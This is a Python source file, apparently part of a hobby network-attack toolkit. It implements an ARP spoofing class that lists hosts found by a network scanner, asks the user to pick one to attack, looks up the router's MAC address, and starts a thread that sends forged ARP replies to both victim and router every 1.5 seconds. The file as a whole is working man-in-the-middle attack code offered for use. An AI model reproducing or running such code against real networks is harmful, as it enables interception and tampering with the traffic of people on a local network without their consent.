"""Arp Spoofing/Poisoning"""
import os
import threading
import time
from arp import Arp
from Recon.network_scanner import NetworkScanner


class ArpSpoof(Arp):
    """Arp Spoofing Related Methods
    """

    def __init__(self, scanner: NetworkScanner):
        self.scanner = scanner
        self.router_ip = self.scanner.get_gate()  # pylint: disable=fixme, no-member
        self.victim = None
        self.menu()
        self.router_mac = None
        self.get_router_mac()

    @staticmethod
    def format_menu(index, values):
        """Format Menu Items"""
        print(f"{index :>5}:  {values[0] :<17}{values[1] :^17}")

    def menu(self):
        """Display the menu to choose who to perform attack on
        """

        os.system('clear')
        menu_items = {

        }
        for count, value in enumerate(self.scanner.net_list):
            menu_items[count] = value
        self.format_menu("Index", ("IP Address", "MAC Address"))
        for key, value in menu_items.items():
            self.format_menu(key+1, value)
        while True:
            try:
                target_index: int = int(input("Select the host to attack (via index): "))
                target_index -= 1  # to get index right
                self.victim = menu_items[target_index]
                return
            except (ValueError, KeyError) as exception:  # pylint: disable=fixme, unused-variable
                print("Not a valid input - Please try again")

    def get_router_mac(self):
        """Get the Mac address of the router

        Returns:
            str: router mac address
        """
        print('[*] Getting router mac address')
        self.send_arp(self.scanner.mac_addr, self.scanner.ip_addr, self.router_ip)
        response = None
        while response is None:
            response = self.recv_arp()
        self.router_mac = bytes.fromhex(response[1].replace(':', ''))
        return

    def poison(self):
        """Execute arp spoofing
        """
        def spoof():
            victim_ip = self.victim[0]
            victim_mac = bytes.fromhex(self.victim[1].replace(':', ''))
            while True:
                self.send_arp(src_ip=self.router_ip, dst_ip=victim_ip,
                              src_mac=self.router_mac, dst_mac=victim_mac, operation=2)  # From the router to the victim
                self.send_arp(src_ip=victim_ip, dst_ip=self.router_ip,
                              src_mac=victim_mac, dst_mac=self.router_mac, operation=2)  # From the victim to the router
                time.sleep(1.5)
        print("[*] Poisoning...")
        poisoning = threading.Thread(target=spoof)
        poisoning.start()
